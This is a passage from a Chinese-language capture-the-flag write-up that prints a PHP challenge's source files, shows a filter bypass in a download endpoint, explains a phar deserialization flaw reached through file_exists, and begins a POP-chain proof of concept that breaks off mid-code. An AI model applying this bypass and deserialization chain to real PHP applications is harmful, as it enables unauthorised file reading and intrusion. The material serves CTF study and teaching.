);</div><div class="line">                    <span class="comment">//请求范围的度量单位</span></div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    <span class="comment">//Content-Length是指定包含于请求或响应中数据的字节长度</span></div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    <span class="comment">//用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。</span></div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );    </div><div class="line"></div><div class="line">                    <span class="comment">//读取文件内容并直接输出到浏览器</span></div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//return safe name</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    $string = str_replace(<span class="string">'%20'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%27'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%2527'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'*'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"'"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">';'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"&#123;"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&#125;'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">    <span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中可以利用<code>$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);</code>进行文件下载绕过，绕过方法如下：</strong></p><p><strong><code>/download.php?name=ind\\ex</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/X6zYCWVL0ipY.png?imageslim" alt="mark"></p><p><strong>通过文件读取和文件下载结合获取源代码：</strong></p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'base.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>base.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    session_start(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt; </div><div class="line">    &lt;title&gt;upload_or_not&lt;/title&gt; </div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt; </div><div class="line">        &lt;div class="container-fluid"&gt; </div><div class="line">        &lt;div class="navbar-header"&gt; </div><div class="line">            &lt;a class="navbar-brand" href="index.php"&gt;首页&lt;/a&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbra-toggle"&gt; </div><div class="line">                &lt;li class="active"&gt;&lt;a href="file.php?file="&gt;查看文件&lt;/a&gt;&lt;/li&gt; </div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"upload_file.php"</span>&gt;上传文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"download.php"</span>&gt;下载文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;/ul&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbar-right"&gt; </div><div class="line">                &lt;li&gt;&lt;a href="index.php"&gt;&lt;span class="glyphicon glyphicon-user"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; </div><div class="line">            &lt;/ul&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">    &lt;/nav&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt; </div><div class="line">&lt;!--flag is in /flag--&gt;</div></pre></td></tr></table></figure><p><strong>file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</div><div class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\/|\.\.|flag/i'</span>,$file)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>); </div><div class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">'/\//i'</span>,$file))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">&#125;</div><div class="line">$show = <span class="keyword">new</span> Show(); </div><div class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </div><div class="line">    $show-&gt;source = $file; </div><div class="line">    $show-&gt;_show(); </div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </div><div class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//show_source(__FILE__); </span></div><div class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </div><div class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>; </div><div class="line">    <span class="comment">//mkdir("upload",0777); </span></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </div><div class="line">        unlink($filename); </div><div class="line">    &#125; </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </div><div class="line">        upload_file_do(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </div><div class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </div><div class="line">    $extension = end($temp); </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </div><div class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> &#123; </div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>upload_file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line">upload_file(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta charest=<span class="string">"utf-8"</span>&gt; </div><div class="line">&lt;title&gt;文件上传&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;div align = <span class="string">"center"</span>&gt; </div><div class="line">        &lt;h1&gt;上传的文件保存在/upload/md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>&lt;/h1&gt; </div><div class="line">&lt;/div&gt; </div><div class="line">&lt;style&gt; </div><div class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </div><div class="line">&lt;/style&gt; </div><div class="line">&lt;div&gt; </div><div class="line">&lt;form action=<span class="string">"upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名:&lt;/label&gt; </div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt; </div><div class="line">&lt;/div&gt;     </div><div class="line"></div><div class="line"></div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>代码审计后发现不能通过文件读取和文件下载直接获取flag，因为这里的过滤无法绕过</strong></p><p><strong>通过class.php代码猜测题目应该是考察的应该是php反序列化漏洞,但是并没有找到unserialize函数,不过发现file.php当中以下的代码可能存在phar反序列化漏洞的问题，php一些函数在使用phar伪协议解析phar文件时，会对phar文件当中的meta-data部分进行反序列化，其中<code>file_exists</code>函数就是其中之一</strong><br><img src="http://pic.c1imber.top/blog/20191019/Tbaro30aL4gW.png?imageslim" alt="mark"></p><p><strong>所以这道题的正确思路是应该是通过phar反序列化获取flag,思路如下：</strong></p><p><strong>构造pop链，生成phar文件，上传-&gt;通过文件读取，使用phar伪协议解析上传的phar文件-&gt;触发file_exists函数，产生php反序列化漏洞-&gt;通过php反序列化获取flag</strong></p><p><strong>构造pop链，生成phar文件：poc如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">'/flag'</span>;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div 